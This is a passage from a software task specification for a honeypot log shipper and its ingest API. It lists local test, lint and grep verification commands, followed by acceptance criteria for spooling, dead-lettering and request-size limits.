  web/src/types/generated CONVENTIONS.md .claude/rules/api.md PRD.md docs/deployment.md
  fixtures/cowrie`.

## Verify

```bash
export TEST_DATABASE_URL=postgresql://sentinel:sentinel@127.0.0.1:5434/sentinelbrief_test TEST_REDIS_URL=redis://127.0.0.1:6380/0
uv run pytest -q -rs tests/test_shipper_config.py tests/test_shipper_tail.py tests/test_shipper_assemble.py tests/test_shipper_spool.py tests/test_shipper_post.py tests/test_shipper_main.py tests/test_shipper_isolation.py tests/test_ingest_body_cap.py tests/test_config.py tests/test_openapi_baseline.py tests/test_env_example_roster.py   # all pass, 0 skipped
grep -rEn "^(from|import) (core|api|worker|evals|tests)\b" honeypot/shipper/sentinelbrief_shipper/   # no output (exit 1)   — run against BASE: the directory does not exist yet, grep exits 2; after GREEN: exit 1
grep -c "require_content_length(request" api/routes/alerts.py                                        # 1   (BASE: 0)
grep -n "INGEST_MAX_BODY_BYTES=" .env.example                                                           # one line (BASE: none)
git diff --exit-code -- api/openapi.json web/src/types/generated && echo "baseline regenerated and committed"
uv run ruff check --no-cache . && uv run ruff format --check . && uv run mypy --no-incremental && uv run lint-imports && uv run pytest -q -rs --cov=api --cov=worker --cov=core --cov=evals --cov-fail-under=90
pnpm -C web codegen && git diff --exit-code -- web/src/types/generated
```

## Acceptance

- The replay log flows through the real tailer, assembler, spool and poster into payloads the
  api's own `SessionAlert` validates and fingerprints identically; an ingest outage spanning
  several sessions loses none and delivers them in close order once the URL returns; a
  permanently rejected payload is dead-lettered and never blocks the queue; no log record ever
  carries an attacker string.
- The shipper is installable from its own `pyproject.toml` with `httpx` as its only dependency,
  runs unprivileged under the hardened unit, and imports nothing from this repo (the signing
  algorithm is a vendored, equality-pinned copy).
- The api refuses an over-cap or length-less ingest request with `413`/`411` before reading a
  byte of body or checking the signature, the cap is a Setting with its `.env.example` line, and
  the OpenAPI baseline + web codegen carry the two new responses.
